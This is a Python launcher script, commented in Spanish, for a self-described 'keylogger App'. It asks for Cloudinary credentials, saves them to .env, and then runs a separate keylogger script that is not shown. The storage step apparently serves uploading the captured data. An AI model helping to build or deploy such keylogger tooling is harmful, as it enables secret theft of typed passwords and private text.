import os
import importlib, subprocess
from pyfiglet import Figlet

def create_env():
    pwd = os.getcwd()
    return pwd

def invoquelogot():
    f = Figlet(font='slant')
    ascii_art = f.renderText('keylogger App')
    print(f'{ascii_art}V.1.0\n')

def controlate_cloud():
    # Define la ruta del archivo .env donde se guardarán las credenciales
    env_file_path = os.path.join(create_env(), '.env')

    # Verifica si el archivo .env ya existe
    if not os.path.isfile(env_file_path):
        # Solicita al usuario las credenciales de Cloudinary
        invoquelogot()
        cloudinary_api_key = input("Ingrese su CLOUDINARY_API_KEY: ")
        cloudinary_api_secret = input("Ingrese su CLOUDINARY_API_SECRET: ")
        cloudinary_cloud_name = input("Ingrese su CLOUDINARY_CLOUD_NAME: ")

        # Abre el archivo .env en modo escritura, creándolo si no existe
        with open(env_file_path, 'w') as env_file:
            # Escribe las credenciales en el archivo .env
            env_file.write(f"CLOUDINARY_API_KEY={cloudinary_api_key}\n")
            env_file.write(f"CLOUDINARY_API_SECRET={cloudinary_api_secret}\n")
            env_file.write(f"CLOUDINARY_CLOUD_NAME={cloudinary_cloud_name}\n")

        print("Las credenciales de Cloudinary se han guardado correctamente en el archivo .env.")
    else:
        print("Las credenciales de Cloudinary ya estan guardadas en el archivo .env.")

def create_now():
    env_file_path = os.path.join(create_env(), '.env')
    if not os.path.isfile(env_file_path):
        controlate_cloud()
    else:
        try:
            invoquelogot()
            script_path = os.getcwd() + '/keyloger/scriptKey.py'
            # print('data-> ', script_path)

            subprocess.run(['python', script_path], check=True)

        except ImportError:
            print("El modulo no se pudo importar.")
        
create_now()